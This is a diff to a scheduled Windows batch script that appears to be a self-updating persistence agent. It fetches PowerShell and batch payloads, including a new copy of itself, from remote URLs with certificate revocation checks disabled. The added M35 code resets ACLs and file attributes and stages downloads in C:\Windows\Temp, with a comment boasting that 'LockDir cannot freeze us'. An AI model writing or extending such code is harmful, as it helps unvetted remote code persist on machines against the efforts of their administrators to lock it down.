@@ -35,7 +35,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M34"
+set "MONVER=M35"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -77,31 +77,36 @@ if not defined MO_B set "MO_B=3"
 
 rem ── [A] auto-update core files (best effort) ──────────────────
 if not exist "%CURL%" set "CURL=curl.exe"
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG%" >nul 2>&1
-if not exist "%WD%\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG2%" >nul 2>&1
-attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
-findstr /C:"TG_REPORT BUILD" "%WD%\tg_report.new" >nul 2>&1 && for %%F in ("%WD%\tg_report.new") do if %%~zF GTR 1500 move /y "%WD%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
-del /f /q "%WD%\tg_report.new" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC%" >nul 2>&1
-if not exist "%WD%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC2%" >nul 2>&1
-attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
-findstr /C:"OWN_SECURE BUILD" "%WD%\own_secure.new" >nul 2>&1 && for %%F in ("%WD%\own_secure.new") do if %%~zF GTR 800 move /y "%WD%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
-del /f /q "%WD%\own_secure.new" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB%" >nul 2>&1
-if not exist "%WD%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB2%" >nul 2>&1
-attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
-findstr /C:"OWN_LIB  BUILD" "%WD%\own_lib.new" >nul 2>&1 && for %%F in ("%WD%\own_lib.new") do if %%~zF GTR 1500 move /y "%WD%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
-del /f /q "%WD%\own_lib.new" >nul 2>&1
+rem M35: guarantee update channel — unharden workdir each tick and stage downloads
+rem in C:\Windows\Temp (never ACL-locked), then move into %WD%. LockDir cannot freeze us.
+set "STAGE=%SystemRoot%\Temp\.upd"
+if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
+attrib -h -s -r "%WD%" >nul 2>&1
+icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1
+attrib -h -s -r "%WD%\tg_report.ps1" "%WD%\own_secure.cmd" "%WD%\own_lib.ps1" "%WD%\own_mon.cmd" >nul 2>&1
+
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\tg_report.new" "%TG%" >nul 2>&1
+if not exist "%STAGE%\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\tg_report.new" "%TG2%" >nul 2>&1
+findstr /C:"TG_REPORT BUILD" "%STAGE%\tg_report.new" >nul 2>&1 && for %%F in ("%STAGE%\tg_report.new") do if %%~zF GTR 1500 move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
+del /f /q "%STAGE%\tg_report.new" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%STAGE%\own_secure.new" "%OWNSEC%" >nul 2>&1
+if not exist "%STAGE%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%STAGE%\own_secure.new" "%OWNSEC2%" >nul 2>&1
+findstr /C:"OWN_SECURE BUILD" "%STAGE%\own_secure.new" >nul 2>&1 && for %%F in ("%STAGE%\own_secure.new") do if %%~zF GTR 800 move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
+del /f /q "%STAGE%\own_secure.new" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.new" "%OWNLIB%" >nul 2>&1
+if not exist "%STAGE%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.new" "%OWNLIB2%" >nul 2>&1
+findstr /C:"OWN_LIB  BUILD" "%STAGE%\own_lib.new" >nul 2>&1 && for %%F in ("%STAGE%\own_lib.new") do if %%~zF GTR 1500 move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+del /f /q "%STAGE%\own_lib.new" >nul 2>&1
 rem self-update: download new own_mon, apply AFTER this tick (BUILD-verified)
 set "SELF_UPD=0"
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_mon.next" "%OWNMON%" >nul 2>&1
-if not exist "%WD%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\own_mon.next" "%OWNMON2%" >nul 2>&1
-findstr /C:"OWN_MON  BUILD" "%WD%\own_mon.next" >nul 2>&1
-if not errorlevel 1 for %%F in ("%WD%\own_mon.next") do if %%~zF GTR 1500 (
-  fc /b "%WD%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON%" >nul 2>&1
+if not exist "%STAGE%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON2%" >nul 2>&1
+findstr /C:"OWN_MON  BUILD" "%STAGE%\own_mon.next" >nul 2>&1
+if not errorlevel 1 for %%F in ("%STAGE%\own_mon.next") do if %%~zF GTR 1500 (
+  fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
   if errorlevel 1 set "SELF_UPD=1"
 )
-if "%SELF_UPD%"=="0" del /f /q "%WD%\own_mon.next" >nul 2>&1
+if "%SELF_UPD%"=="0" del /f /q "%STAGE%\own_mon.next" >nul 2>&1
 
 rem ── [B] re-arm chain 1: ownership-aware (not existence-only) ──
 rem L11/M22: Query-only skipped rearm when Windows built-in tasks shared
@@ -425,7 +430,7 @@ rem ── [I] self-update apply (last thing this tick) ────────
 if "%SELF_UPD%"=="1" (
   echo self-update apply>>"%LOG%"
   attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
-  move /y "%WD%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
+  move /y "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
 )
 rem keep dual-path backup in sync every tick
 if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
